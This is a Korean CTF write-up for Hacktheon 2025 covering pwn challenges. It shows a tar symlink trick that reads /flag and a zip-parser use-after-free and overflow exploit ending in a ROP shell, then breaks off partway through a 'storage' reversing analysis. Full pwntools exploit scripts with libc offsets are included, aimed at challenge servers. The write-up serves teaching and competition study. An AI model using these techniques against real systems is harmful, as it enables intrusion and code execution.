---
title: 2025 Hacktheon CTF writeup
description: HSPACE에서 출제한 2024 HCTF 전체 문제 풀이입니다.
author: 박기태(kitaep), 박성준(realsung), 박창완(diff), 안건희(ipwn)
date: 2025-05-30 20:00:00 +0900
tags: [Tech, CTF]
categories: [Tech, CTF]
comments: false
math: true
mermaid: false
pin: false
image: /assets/img/2025_hacktheon_writeup/hacktheon.jpg
---
# 2025 Hacktheon CTF writeup

### 박기태(kitaep), 박성준(realsung), 박창완(diff), 안건희(ipwn)

## 목차
1. [tar](#tar) - pwn
2. [zip](#zip) - pwn
3. [storage](#storage) - pwn
4. [contract](#contract) - pwn
5. [rev-chall1](#rev-chall1) - rev
6. [rev-chall2](#rev-chall2) - rev
7. [frontdoor-1](#frontdoor-1) - web
8. [frontdoor-2](#frontdoor-2) - web
7. [web-chall1](#web-chall1) - web
8. [web-chall2](#web-chall2) - web
9. [crypto-chall1](#crypto-chall1) - crypto
10. [crypto-chall2](#crypto-chall2) - crypto
11. [crypto-chall3](#crypto-chall3) - crypto
12. [forensic-chall1](#forensic_chall1) - forensic
13. [forensic-chall2](#forensic-chall2) - forensic
14. [forensic-chall3](#forensic-chall3) - forensic
15. [hidden message](#hidden-message) - misc
16. [misc-chall1](#misc-chall2) - misc
17. [misc-chall2](#misc-chall1) - misc


### pwn
#### tar 
이 문제는 tar로 압축된 file을 입력받아서 압축 해제한 뒤 파일 내용을 읽어주는 컨셉의 문제였습니다.

```py
def main():
    print_banner()
    
    print("\nEnter your tar archive encoded in base64:")

    # Caution! Your input must be less than 4096 bytes
    base64_data = input()
    if not base64_data:
        print("No data entered.")
        return
    
    result = extract_archive(base64_data)
    if "error" in result:
        print(f"\nError: {result['error']}")
        return
    
    print(f"\n{result['message']}")
    
    try:
        while True:
            print("\nFile List:")
            print("[0] Exit")
            
            for i, file in enumerate(current_extract_info["files"], 1):
                print(f"[{i}] {file['name']}")
            
            try:
                file_choice = int(input("\nEnter the number of the file to read (0 to exit): ").strip())
                
                if file_choice == 0:
                    print("\nExiting service. Thank you!")
                    break
                
                file_index = file_choice - 1
                
                if file_index < 0 or file_index >= len(current_extract_info["files"]):
                    print(f"\nInvalid file number. Please enter a value between 1 and {len(current_extract_info['files'])}.")
                    continue
                
                result = read_file_content(file_index)
                print_file_content(result)
                
            except ValueError:
                print("Please enter a valid number.")
    finally:
        cleanup_result = cleanup_extract_dir()
        if "error" in cleanup_result:
            print(f"\nWarning: {cleanup_result['error']}")

if __name__ == "__main__":
    main()
```

코드를 보면 단순히 tar 파일을 base64 형태로 입력받고, extract하여 지정한 tar 파일 내의 압축된 파일 내용들을 출력해주는 것이 전부입니다.

취약점은 단순했습니다.

```py
def extract_archive(base64_data):
    try:
        try:
            decoded_data = base64.b64decode(base64_data)
        except Exception as e:
            return {"error": f"Base64 decoding failed: {str(e)}"}
        
        tar_bytes = io.BytesIO(decoded_data)
        
        if not os.path.exists(USER_FILES_DIR):
            os.makedirs(USER_FILES_DIR)
        
        timestamp = int(time.time())
        random_suffix = generate_random_string()
        extract_dir_name = f"{timestamp}_{random_suffix}"
        extract_dir_path = os.path.join(USER_FILES_DIR, extract_dir_name)
        
        os.makedirs(extract_dir_path)
        
        extracted_files = []
        
        try:
            with tarfile.open(fileobj=tar_bytes, mode='r') as tar:
                tar.extractall(path=extract_dir_path)
                
                for member in tar.getmembers():
                    if member.isdir():
                        continue
                    
                    file_path = os.path.join(extract_dir_path, member.name)
                    
                    extracted_files.append({
                        "name": member.name,
                        "path": file_path
                    })
        except Exception as e:
            shutil.rmtree(extract_dir_path, ignore_errors=True)
            return None
        
        global current_extract_info
        current_extract_info["files"] = extracted_files
        current_extract_info["extract_dir"] = extract_dir_path
        
        return {
            "success": True,
            "message": f"{len(extracted_files)} files have been successfully extracted.",
            "files": extracted_files
        }
        
    except Exception as e:
        return {"error": f"Error occurred during processing: {str(e)}"}
```

**tar**는 hard, symbolic link 형태의 파일을 포함하여 압축하는 것도 가능한 linux-friendly한 압축 형태입니다. 또한 이 문제의 extract과정에서는 linking된 파일에 대한 검증이 따로 존재하지 않습니다.

즉, `/flag`라는 경로를 link하는 파일을 tar형태로 압축한 뒤 base64형태의 데이터로 전송해주고, 파일 내용을 읽는다면 서버 내의 플래그를 읽어올 수 있습니다.

##### ex.py
```python
from pwn import *
import base64
import os
import tarfile

os.symlink('/flag', 'hack')

with tarfile.open('hack.tar', 'w') as tar:
    tar.add('hack')

with open('hack.tar', 'rb') as f:
    buf = f.read()

b64 = base64.b64encode(buf)
p = remote('hacktheon2025-challs-nlb-81f078c4ab2677e2.elb.ap-northeast-2.amazonaws.com', 32496)

p.sendlineafter(b'base64:', b64)

p.interactive()
```

#### zip
tar 문제와 이름은 유사하지만, 단순한 trick성 문제는 아니고 정통 pwnable문제였습니다.

입력은 이전 문제와 유사하게 base64로 encoding한 zip파일을 전송합니다. 하지만 이를 여러번 반복할 수 있고, 파일 이름 list를 가져오거나 내용을 base64 encoded 된 상태로 읽을 수 있습니다.

취약점은 두 가지가 존재했습니다. 첫 번째는 custom memory allocator에 의한 UAF였습니다. 

```c
__int64 __fastcall parse_zip_file(zip_structure *a1, FILE *zip_file)
{
  unsigned int v2; // ebp
  unsigned __int64 v4; // r12
  unsigned __int64 total_entries; // rax
  central_directory_entry *central_dir_ent; // r15
  char *filename; // rdi
  char *extra_field; // rdi
  char *comment; // rdi
  __int64 v10; // r12
  local_file_entry *v11; // r15

  if ( !read_ecd(a1->end_of_central_directory, zip_file, &a1->zip_comment) )
    return 0;
  a1->central_directory_entries = memory_allocator(8 * a1->end_of_central_directory->total_entries);
  a1->local_file_entries = memory_allocator(8 * a1->end_of_central_directory->total_entries);
  fseek(zip_file, a1->end_of_central_directory->central_directory_offset, 0);
  LOBYTE(v2) = 1;
  if ( a1->end_of_central_directory->total_entries )
  {
    v4 = 0LL;
    do
    {
      central_dir_ent = memory_allocator(0x48);
      *central_dir_ent->hdr.signature = 0LL;
      *&central_dir_ent->hdr.crc32 = 0LL;
      *&central_dir_ent->hdr.comment_length = 0LL;
      *&central_dir_ent->extra_field = 0LL;
      central_dir_ent->filename = 0LL;
      a1->central_directory_entries[v4] = central_dir_ent;
      if ( !read_cde(central_dir_ent, zip_file) )
      {                                         // CDE는 실패해도 대충 영역만 free로 처리하고 그대로 진행됨 LFE 파싱할 때 -> UAF를?

        filename = central_dir_ent->filename;
        if ( filename )
          trip_using_bit(filename);
        extra_field = central_dir_ent->extra_field;
        if ( extra_field )
          trip_using_bit(extra_field);
        comment = central_dir_ent->comment;
        if ( comment )
          trip_using_bit(comment);
        trip_using_bit(central_dir_ent);
      }
      ++v4;
      total_entries = a1->end_of_central_directory->total_entries;
    }
    while ( v4 < total_entries );
    if ( total_entries )
    {
      v10 = 0LL;
      while ( 1 )
      {
        fseek(zip_file, a1->central_directory_entries[v10]->hdr.local_header_offset, 0);
        v11 = memory_allocator(0x48);
        *v11->hdr.signature = 0LL;
        *(&v11->hdr.crc32 + 2) = 0LL;
        *&v11->extra = 0LL;
        *&v11->filename = 0LL;
        v11->uncomp_buf = 0LL;
        a1->local_file_entries[v10] = v11;
        if ( !read_lfe(v11, zip_file) )
          break;
        if ( ++v10 >= a1->end_of_central_directory->total_entries )
          return v2;
      }
      destruct_local_file(v11);
      return 0;
    }
  }
  return v2;
}
```

zip파일은 몇 가지의 헤더와 바디로 나눠져있기 때문에, parsing하는 과정에서 여러개의 구조체를 파싱해야합니다. 첫째로 가장 마지막 부분에 위치하는 `end_of_central_directory` 구조체를 파싱합니다. 

그 이후, file의 body에 대한 메타데이터(?)급의 정보를 담는 `central_dir_entry`(이하 cde) 구조체를 파싱하고, 이후에는 `local_file_entries`(이하 lfe)를 파싱합니다. 그러나 이때, 위 코드를 보시면 알 수 있겠지만, `central_dir_entry`를 파싱하다 중간에 실패하는 경우에는 메모리를 지우거나 강제로 프로세스를 종료하지 않고, 공간과 데이터가 할당된 영역을 freed 상태로 변환시키기만 합니다.

또한 cde와 lfe 구조체는 둘 다 0x48로 구조체의 크기가 같습니다. 따라서 cde를 prasing하는 도중 의도적으로 실패를 유발하고 lfe를 할당받는다면 같은 공간을 재사용하며 `UAF`가 발생하게 됩니다.

```C
#pragma pack(push, 1)
struct central_directory_entry_hdr
{
  char signature[4];
  uint16_t version_made_by;
  uint16_t version_needed;
  uint16_t general_purpose_bit_flag;
  uint16_t compression_method;
  uint16_t last_mod_time;
  uint16_t last_mod_date;
  uint32_t crc32;
  uint32_t compressed_size;
  uint32_t uncompressed_size;
  uint16_t filename_length;
  uint16_t extra_field_length;
  uint16_t comment_length;
  uint16_t disk_number_start;
  uint16_t internal_file_attrs;
  uint32_t external_file_attrs;
  uint32_t local_header_offset;
};
#pragma pack(pop)
struct central_directory_entry
{
  central_directory_entry_hdr hdr;
  char *extra_field;
  char *comment;
  char *filename;
};

#pragma pack(push, 1)
struct local_file_header
{
  char signature[4];
  uint16_t version_needed;
  uint16_t general_purpose_bit_flag;
  uint16_t compression_method;
  uint16_t last_mod_time;
  uint16_t last_mod_date;
  uint32_t crc32;
  uint32_t compressed_size;
  uint32_t uncompressed_size;
  uint16_t filename_length;
  uint16_t extra_field_length;
  uint8_t status;
};
#pragma pack(pop)

struct local_file_entry
{
  local_file_header hdr;
  char *extra;
  char *desc;
  char *filename;
  char *comp_buf;
  char *uncomp_buf;
};
```

구조체를 확인해보면, lfe의 filename 멤버 변수부터 uncomp_buf 멤버변수까지, cde의 멤버변수들과 모두 겹치는 것을 확인할 수 있습니다. 

```C
char __fastcall list_zip_entries(zip_structure *a1)
{
  raw_end_of_central_directory *eocr; // rax
  unsigned __int64 i; // r15
  central_directory_entry *central_dir; // rcx
  local_file_entry *local_file; // rdx
  char *filename; // r12
  uint16_t filename_length; // bp

  eocr = a1->end_of_central_directory;
  if ( eocr->total_entries )
  {
    for ( i = 0LL; i < eocr->total_entries; ++i )
    {
      central_dir = a1->central_directory_entries[i];
      local_file = a1->local_file_entries[i];
      filename = local_file->filename;
      if ( filename )
      {
        filename_length = local_file->hdr.filename_length;
        if ( filename_length )
          goto LABEL_6;
      }
      else
      {
        filename = central_dir->filename;
        filename_length = local_file->hdr.filename_length;
        if ( filename_length )
        {
LABEL_6:
          if ( filename )
            goto LABEL_10;
          continue;
        }
      }
      filename_length = central_dir->hdr.filename_length;
      if ( filename )
      {
LABEL_10:
        if ( filename_length )
        {
          printf("Entry %d: ", i);
          fwrite(filename, 1uLL, filename_length, stdout);// filename buffer는 cde에서 가져오고 길이는 lfe에서 가져옴
          putchar(10);
          eocr = a1->end_of_central_directory;
        }
      }
    }
  }
  return 1;
}
```

또한, zip file의 entries를 출력하는 함수에서는 filename을 출력할 때, lfe 혹은 cde구조체만을 활용하는 것이 아니라 값들을 혼용하는 것을 확인할 수 있습니다. 즉, UAF를 적절히 활용하여 데이터를 배치하면 범위를 넘어선 영역의 데이터를 fwrite로 출력할 수 있고, 이를 통해 memory leak이 가능합니다.

두 번째 취약점은 zip 파일을 extract하는 과정에서 발생합니다.

```C
char __fastcall extract_zip_entries(zip_structure *a1)
{
  char result; // al
  __int64 v2; // r12
  central_directory_entry *central_dir; // rbp
  local_file_entry *local_file; // rbx
  int uncomp_sze; // r13d
  char *loc_uncomp_buf_; // rbp
  __int16 compression_method; // ax
  unsigned int comp_sze; // edx
  char *loc_uncomp_buf; // rcx
  char *v10; // rbx

  result = 1;
  if ( a1->end_of_central_directory->total_entries )
  {
    v2 = 0LL;
    while ( 1 )
    {
      central_dir = a1->central_directory_entries[v2];
      local_file = a1->local_file_entries[v2];
      if ( local_file->hdr.status )
      {
        uncomp_sze = local_file->hdr.uncompressed_size;
        if ( uncomp_sze )
          goto LABEL_6;
        goto LABEL_16;
      }
      compression_method = local_file->hdr.compression_method;
      if ( compression_method )
      {
        comp_sze = local_file->hdr.compressed_size;
        if ( !comp_sze )
          goto LABEL_12;
      }
      else
      {
        compression_method = central_dir->hdr.compression_method;
        comp_sze = local_file->hdr.compressed_size;
        if ( !comp_sze )
        {
LABEL_12:
          comp_sze = central_dir->hdr.compressed_size;
          if ( !comp_sze )
            goto LABEL_15;
        }
      }
      loc_uncomp_buf = local_file->uncomp_buf;
      if ( loc_uncomp_buf && !decompress(compression_method, local_file->comp_buf, comp_sze, loc_uncomp_buf) )// overflow
        return 0;
LABEL_15:
      local_file->hdr.status = 1;
      uncomp_sze = local_file->hdr.uncompressed_size;
      if ( uncomp_sze )
      {
LABEL_6:
        loc_uncomp_buf_ = local_file->uncomp_buf;
        if ( loc_uncomp_buf_ )
          goto LABEL_17;
        goto LABEL_3;
      }
LABEL_16:
      uncomp_sze = central_dir->hdr.uncompressed_size;
      loc_uncomp_buf_ = local_file->uncomp_buf;
      if ( loc_uncomp_buf_ )
      {
LABEL_17:
        if ( uncomp_sze )
        {
          v10 = malloc(2 * (((0xAAAAAAAB * (uncomp_sze + 2)) >> 32) & 0xFFFFFFFE) + 1);
          b64encode(loc_uncomp_buf_, uncomp_sze, v10);
          printf("Entry %d: %s\n", v2, v10);
        }
      }
LABEL_3:
      if ( ++v2 >= a1->end_of_central_directory->total_entries )
        return 1;
    }
  }
  return result;
}

__int64 __fastcall decompress(__int16 comp_method, char *comp_buf, unsigned int sze, char *uncomp_buf)
{
  vtable *v6; // rax
  __int64 result; // rax

  v6 = vtable_5018;
  if ( !vtable_5018 )
  {
    v6 = memory_allocator(128);
    v6->memmove = sub_1580;
    v6->func1 = sub_15A0;
    v6->func2 = sub_15A0;
    v6->func3 = sub_15A0;
    v6->func4 = sub_15A0;
    v6->func5 = sub_15A0;
    v6->func6 = sub_15A0;
    v6->func7 = sub_15A0;
    v6->func8 = sub_15A0;
    v6->func9 = sub_15A0;
    v6->func10 = sub_15A0;
    v6->func11 = sub_15A0;
    v6->func12 = sub_15A0;
    v6->func13 = sub_15A0;
    v6->func14 = sub_15A0;
    vtable_5018 = v6;
  }
  switch ( comp_method )
  {
    case 0:
      goto LABEL_19;
    case 1:
      v6 = (v6 + 8);
      goto LABEL_19;
    case 2:
      v6 = (v6 + 16);
      goto LABEL_19;
    case 3:
      v6 = (v6 + 24);
      goto LABEL_19;
    case 4:
      v6 = (v6 + 32);
      goto LABEL_19;
    case 5:
      v6 = (v6 + 40);
      goto LABEL_19;
    case 6:
      v6 = (v6 + 48);
      goto LABEL_19;
    case 8:
      v6 = (v6 + 56);
      goto LABEL_19;
    case 9:
      v6 = (v6 + 64);
      goto LABEL_19;
    case 12:
      v6 = (v6 + 72);
      goto LABEL_19;
    case 14:
      v6 = (v6 + 80);
      goto LABEL_19;
    case 96:
      v6 = (v6 + 88);
      goto LABEL_19;
    case 97:
      v6 = (v6 + 96);
      goto LABEL_19;
    case 98:
      v6 = (v6 + 104);
      goto LABEL_19;
    case 99:
      v6 = (v6 + 112);
LABEL_19:
      result = (v6->memmove)(comp_buf, sze, uncomp_buf);
      break;
    default:
      result = 0LL;
      break;
  }
  return result;
}

char __fastcall sub_1580(void *src, size_t n, void *dest)
{
  memmove(dest, src, n);
  return 1;
}
```

`decompress`함수를 호출하는 부분을 보면, source buffer로는 `comp_buf`, size로는 `compressed_size`를 넘겨주고 있지만, destination으로는 `uncomp_buf`를 전달합니다. 또한, 압축된 파일을 prasing 때, uncompressed buffer를 함께 읽어옵니다. (그럼 더 이상 압축이 아니긴 합니다만..) 때문에, uncomp_buf는 comp_buf의 size보다 작게 설정될 수 있고, 이를 통해 buffer overrun이 발생할 수 있습니다.

이 overrun은 comp_buf보다 나중에 할당된 모든 영역의 메모리를 overwrite할 수 있기 때문에 헤더 데이터나 포인터 등을 모두 덮어씌울 수 있습니다. 이 이후로는 fsop, rop 등 선호하는 exploit 방법으로 exploit하면 됩니다. 제 경우에는 glibc 버전이 바뀔 때마다 exploit 방식도 바뀌게 되는 fsop를 비선호하기에 `environ`을 leak한 후, stack rop로 shell을 획득했습니다.

##### ex.py
```py
from pwn import *
import base64

# p = remote('hacktheon2025-challs-nlb-81f078c4ab2677e2.elb.ap-northeast-2.amazonaws.com', 22193)
# p = process('./zip', aslr=False, level='debug')
p = remote('localhost', 9999)

def build_custom_zip(lf_hdr: list, cd_hdr: list, eocr: dict) -> bytes:
    zip_buf = b''
    local_header_size = 0
    loc_hdr_offset = [0, ]
    for hdr in lf_hdr:
        # === Local File Header (30 bytes) ===
        zip_buf += b'PK\x03\x04'            # Local file header signature
        zip_buf += p16(20)                  # Version needed to extract
        zip_buf += p16(hdr['gen_bit'])      # General purpose bit flag
        zip_buf += p16(hdr['comp_method'])  # Compression method
        zip_buf += p16(0)                   # File last mod time
        zip_buf += p16(0)                   # File last mod date
        zip_buf += p32(0)                   # CRC-32 (set to 0 for simplicity)
        zip_buf += p32(hdr['comp_sze'])     # Compressed size
        zip_buf += p32(hdr['uncomp_sze'])   # Uncompressed size
        zip_buf += p16(hdr['filename_sze']) # File name length
        zip_buf += p16(hdr['extra_sze'])    # Extra field length
        zip_buf += hdr['filename']          # File name
        zip_buf += hdr['extra']             # extra
        zip_buf += hdr['comp']              # comp File content
        zip_buf += hdr['uncomp']            # uncomp File content
        if hdr['gen_bit'] == 8:
            zip_buf += hdr['desc']    # data_descriptor

        local_header_size += 30 \
                            + len(hdr['filename']) \
                            + len(hdr['extra']) \
                            + len(hdr['comp']) \
                            + len(hdr['uncomp']) 
        if hdr['gen_bit'] == 8:
            local_header_size += 12
        loc_hdr_offset.append(local_header_size)

    cd_header_size = 0
    for i in range(len(cd_hdr)):
        # === Central Directory Header (46 bytes) ===
        zip_buf += b'PK\x01\x02'                    # Central dir file header signature
        zip_buf += p16(20)                          # Version made by
        zip_buf += p16(20)                          # Version needed to extract
        zip_buf += p16(0)                           # General purpose bit flag
        zip_buf += p16(cd_hdr[i]['comp_method'])    # Compression method
        zip_buf += p16(0)                           # File last mod time
        zip_buf += p16(0)                           # File last mod date
        zip_buf += p32(0)                           # CRC-32 (not calculated)
        zip_buf += p32(cd_hdr[i]['comp_sze'])             # Compressed size
        zip_buf += p32(cd_hdr[i]['uncomp_sze'])           # Uncompressed size
        zip_buf += p16(cd_hdr[i]['filename_sze'])         # File name length
        zip_buf += p16(cd_hdr[i]['extra_sze'])            # Extra field length
        zip_buf += p16(cd_hdr[i]['comment_sze'])          # File comment length
        zip_buf += p16(0)                           # Disk number start
        zip_buf += p16(0)                           # Internal file attributes
        zip_buf += p32(0)                           # External file attributes
        zip_buf += p32(loc_hdr_offset[i])           # Relative offset of local header
        zip_buf += cd_hdr[i]['filename']                  # File name
        zip_buf += cd_hdr[i]['extra']
        zip_buf += cd_hdr[i]['comment']

        cd_header_size += 46 \
                        + len(cd_hdr[i]['filename']) \
                        + len(cd_hdr[i]['extra']) \
                        + len(cd_hdr[i]['comment'])
    
    # === End of Central Directory Record (22 bytes) ===
    zip_buf += b'PK\x05\x06'                # EOCD signature
    zip_buf += p16(0)                       # Number of this disk
    zip_buf += p16(0)                       # Disk where CD starts
    zip_buf += p16(eocr['num_of_cd'])       # Number of CD records on this disk
    zip_buf += p16(eocr['num_of_cd'])       # Total number of CD records
    zip_buf += p32(cd_header_size)          # Size of central directory
    zip_buf += p32(local_header_size)       # Offset of start of central directory
    zip_buf += p16(len(eocr['comment']))    # zip_buf file comment length
    zip_buf += eocr['comment']
    b64 = base64.b64encode(zip_buf)
    with open('zzzzzz.zip', 'wb') as f:
        f.write(zip_buf)
    return b64

def make_lf(gen_bit, comp_method, comp, comp_sze, uncomp, uncomp_sze, fn, fn_sze, ext, ext_sze) -> dict:
    lf_hdr = {}
    lf_hdr['gen_bit']       = gen_bit
    lf_hdr['comp_method']   = comp_method
    lf_hdr['comp']          = comp
    lf_hdr['comp_sze']      = comp_sze
    lf_hdr['uncomp']        = uncomp
    lf_hdr['uncomp_sze']    = uncomp_sze
    lf_hdr['filename']      = fn
    lf_hdr['filename_sze']  = fn_sze
    lf_hdr['extra']         = ext
    lf_hdr['extra_sze']     = ext_sze
    return lf_hdr

def make_cde(comp_method, comp_sze, uncomp_sze, fn, fn_sze, ext, ext_sze, cmt, cmt_sze) -> dict:
    cd_hdr = {}
    cd_hdr['comp_method']   = comp_method
    cd_hdr['comp_sze']      = comp_sze
    cd_hdr['uncomp_sze']    = uncomp_sze
    cd_hdr['filename']      = fn
    cd_hdr['filename_sze']  = fn_sze
    cd_hdr['extra']         = ext
    cd_hdr['extra_sze']     = ext_sze
    cd_hdr['comment']       = cmt
    cd_hdr['comment_sze']   = cmt_sze
    return cd_hdr

def make_eocr(num_of_cd, cmt=b'') -> dict:
    eocr = {}
    eocr['num_of_cd'] = num_of_cd
    eocr['comment'] = cmt

    return eocr

lf1 = make_lf(0, 0, b'A'*0x10, 0x10, b'B'*0x18, 0x18, b'', 0x0, b'C'*0x50, 0x50)
lf2 = make_lf(0, 0, b'a'*0x10, 0x10, b'b'*0x10, 0x10, b'', 0x0, b'c'*0x10, 0x10)

lf_hdrs = [lf1, lf2]

cd1 = make_cde(0, 0x10, 0x10, b'zzzz/zxxx', 0x9, b'Z'*0x10, 0x10, b'z'*0x10, 0x10)
cd2 = make_cde(0, 0x10, 0x10, b'dddd/dddd', 0x9, b'z'*0x10, 0x10, b'Z'*0x10, 0x80)
cd_hdrs = [cd1, cd2]

eocr = make_eocr(len(cd_hdrs))

buf = build_custom_zip(lf_hdrs, cd_hdrs, eocr)

p.sendlineafter(b'>> ', buf)
p.sendlineafter(b'>> ', b'1')
p.recvuntil(b'Entry 1: ')
p.recv(0x38)
leak        = u64(p.recv(8))
ld_base     = leak - 0x374a0
libc        = leak - 0x2644a0
environ     = libc + 0x222200
prdi        = libc + 0x16efaf
binsh       = libc + 0x1d8678
system      = libc + 0x50d70

# pause()
# leak = u64(p.recvuntil(b'\x7f')[-6:] + b'\0\0')
log.info('LEAK      : %#x'%leak)
log.info('LD_BASE   : %#x'%ld_base)
log.info('LIBC      : %#x'%libc)

p.sendlineafter(b'>> ', b'0')

pay = b''
pay += p64(0)*2
pay += b'PK\x03\x04'
pay += p16(20)
pay += p16(0)
pay += p16(0)
pay += p16(0)
pay += p16(0)
pay += p32(0)
pay += p32(0)
pay += p32(0)
pay += p16(0x8)
pay += p16(0)
pay += p16(0)
pay += p64(0)
pay += p64(0)
pay += p64(environ)

lf1 = make_lf(0, 0, b'A'*0x10, 0x10, b'B'*0x10, 0x10, b'y'*0x8, 0x8, b'', 0x0)
lf2 = make_lf(0, 0, pay, len(pay), b'b'*0x10, 0x10, b'y'*0x8, 0x8, b'', 0x0)
lf3 = make_lf(0, 0, b'a'*0x10, 0x10, b'b'*0x10, 0x10, b'y'*0x8, 0x8, b'', 0x0)

lf_hdrs = [lf1, lf2, lf3]

cd1 = make_cde(0, 0x10, 0x10, b'', 0x0, b'', 0x0, b'', 0x0)
cd2 = make_cde(0, 0x10, 0x10, b'', 0x0, b'', 0x0, b'', 0x0)
cd3 = make_cde(0, 0x10, 0x10, b'', 0x0, b'', 0x0, b'', 0x0)

cd_hdrs = [cd1, cd2, cd3]

eocr = make_eocr(len(cd_hdrs))

buf = build_custom_zip(lf_hdrs, cd_hdrs, eocr)
p.sendlineafter(b'>> ', buf)
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'>> ', b'1')
p.recvuntil(b'Entry 2: ')
stack = u64(p.recv(8))
log.info('STACK     : %#x'%stack)
p.sendlineafter(b'>> ', b'0')


rop = p64(prdi + 1) + p64(prdi) + p64(binsh) + p64(system) + b'ipwn'

pay = b''
pay += p64(0)*2
pay += b'PK\x03\x04'
pay += p16(20)
pay += p16(0)
pay += p16(0)
pay += p16(0)
pay += p16(0)
pay += p32(0)
pay += p32(len(rop))
pay += p32(0)
pay += p16(0x8)
pay += p16(0)
pay += p16(0)
pay += p64(0)
pay += p64(0)
pay += p64(environ)
pay += p64(leak + 0x4b8)
pay += p64(stack - 0x1170)

lf1 = make_lf(0, 0, b'A'*0x10, 0x10, b'B'*0x10, 0x10, b'y'*0x8, 0x8, b'', 0x0)
lf2 = make_lf(0, 0, b'A'*0x10, 0x10, b'B'*0x10, 0x10, b'y'*0x8, 0x8, b'', 0x0)
lf3 = make_lf(0, 0, pay, len(pay), b'b'*0x10, 0x10, b'y'*0x8, 0x8, b'', 0x0)
lf4 = make_lf(0, 0, rop, len(rop), b'b'*0x10, 0x10, b'y'*0x8, 0x8, b'', 0x0)

lf_hdrs = [lf1, lf2, lf3, lf4]

cd1 = make_cde(0, 0x10, 0x10, b'', 0x0, b'', 0x0, b'', 0x0)
cd2 = make_cde(0, 0x10, 0x10, b'', 0x0, b'', 0x0, b'', 0x0)
cd3 = make_cde(0, 0x10, 0x10, b'', 0x0, b'', 0x0, b'', 0x0)
cd4 = make_cde(0, 0x10, 0x10, b'', 0x0, b'', 0x0, b'', 0x0)

cd_hdrs = [cd1, cd2, cd3, cd4]

eocr = make_eocr(len(cd_hdrs))

buf = build_custom_zip(lf_hdrs, cd_hdrs, eocr)
p.sendlineafter(b'>> ', buf)
pause()
p.sendlineafter(b'>> ', b'2')
p.interactive()
```

#### storage
데이터를 저장하는 storage protocol이라는 컨셉의 문제였습니다. reversing task가 적지 않았던 것을 제외하면 간단히 exploit할 수 있었습니다. TMI지만 요즘은 IDA에 mcp plugin도 붙여줄 수 있으니 이를 적절히 잘 활용할 수 있다면 reversing task를 크게 간소화 할 수 있습니다!

```c
unsigned __int64 init()
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  mapping();
  sub_11E0();
  return __readfsqword(0x28u);
}

unsigned __int64 mapping()
{
  g_map = malloc(0x10000uLL);
  memset(g_map, 0, 0x10000uLL);
  return __readfsqword(0x28u);
}

unsigned __int64 sub_11E0()
{
  size_t bm_size; // [rsp+0h] [rbp-30h]
  int j; // [rsp+Ch] [rbp-24h]
  unsigned __int64 len; // [rsp+10h] [rbp-20h]
  int i; // [rsp+1Ch] [rbp-14h]

  BITMAPS = malloc(0x48uLL);
  memset(BITMAPS, 0, 0x48uLL);
  for ( i = 0; i < 9; ++i )
    MAP_SIZE += CHUNK_CNT[i] * CHUNK_SIZES[i];
  MAP_SIZE = (MAP_SIZE + 0xFFF) & 0xFFFFFFFFFFFFF000LL;
  for ( len = 1LL; len < MAP_SIZE; len *= 2LL ) // 0x25000
    ;
  MAYBE_LIM = len - 1;                          // 0x3ffff
  MMAPED = mmap(0LL, len, 3, 34, -1, 0LL);      // 0x40000
  if ( MMAPED == -1 )
    exit(1);
  PTR = MMAPED;
  for ( j = 0; j < 9; ++j )
  {
    CHUNK_MAPS[j] = PTR;
    PTR += CHUNK_CNT[j] * CHUNK_SIZES[j];
    bm_size = (CHUNK_CNT[j] + 7) / 8;
    BITMAPS[j] = malloc(bm_size);               // malloc size list ==> |8|8|8|4|4|4|2|2|2| bitmap이군
    memset(BITMAPS[j], 0, bm_size);
  }
  return __readfsqword(0x28u);
}
```

memory map과 custom heap layout을 initailize해주는 부분을 분석해보면, 각 chunk의 size들, size에 할당된 chunk의 개수, mmap으로 구분한 chunk map, used bit를 기록하는 bitmap을 어떻게 설정하는지 분석할 수 있습니다.

또한 이 전에, protocol의 입력을 받는 `g_map`변수를 0x10000크기로 ptmalloc heap에 할당합니다.

```c
__int64 main_routine()
{
  int v1; // [rsp+4h] [rbp-Ch]

  read(0, g_map, 8uLL);                         // [instruction(4bytes)|size(4bytes)]
  v1 = vm_run(g_map);
  if ( v1 < 0 )
    exit(255);
  memset(g_map, 0, 0x10000uLL);
  dword_6128 = 0;
  return v1;
}
```

main으로 작동하는 routine에서는 protocol 입력을 instruction(4bytes), payload counts(4bytes)으로 구분하여 8bytes를 입력받습니다.

```c
__int64 __fastcall vm_run(packet *a1)
{
  const char *v2; // [rsp+10h] [rbp-70h]
  unsigned int v3; // [rsp+1Ch] [rbp-64h]
  char *hex_str; // [rsp+20h] [rbp-60h]
  unsigned int data_size; // [rsp+2Ch] [rbp-54h]
  payload *v6; // [rsp+30h] [rbp-50h]
  int data_cnt; // [rsp+40h] [rbp-40h]
  int inst; // [rsp+44h] [rbp-3Ch]
  unsigned int v9; // [rsp+54h] [rbp-2Ch]
  unsigned int v10; // [rsp+54h] [rbp-2Ch]
  unsigned int v11; // [rsp+54h] [rbp-2Ch]
  unsigned int v12; // [rsp+54h] [rbp-2Ch]
  char *v14; // [rsp+68h] [rbp-18h] BYREF
  void *ptr; // [rsp+70h] [rbp-10h] BYREF
  unsigned __int64 v16; // [rsp+78h] [rbp-8h]

  v16 = __readfsqword(0x28u);
  inst = a1->inst;
  data_cnt = a1->data_cnt;
  v6 = parse_packet_data(a1->raw_payload, data_cnt);
  switch ( inst )
  {
    case 1:
        . . .
  }
}

payload *__fastcall parse_packet_data(char *raw_payload, unsigned __int16 a2)
{
  unsigned int j; // [rsp+8h] [rbp-38h]
  int i; // [rsp+Ch] [rbp-34h]
  payload *s; // [rsp+18h] [rbp-28h]

  if ( !a2 )
    return 0LL;
  s = malloc(0x10LL * a2);
  memset(s, 0, 16LL * a2);
  for ( i = 0; i < a2; ++i )
  {
    read(0, raw_payload, 2uLL);                 // size
    s[i].size = *raw_payload;
    for ( j = 0; j < *raw_payload; ++j )
      read(0, &raw_payload[j + 2], 1uLL);
    s[i].buffer = raw_payload + 2;
    raw_payload += *raw_payload + 2;
  }
  return s;
}
```

이제 payload count의 개수에 맞게 payload들을 하나씩 입력을 받는데, 이 때 각 payload의 size를 2bytes씩, 그리고 실제 payload body를 입력한 size만큼 입력받습니다.

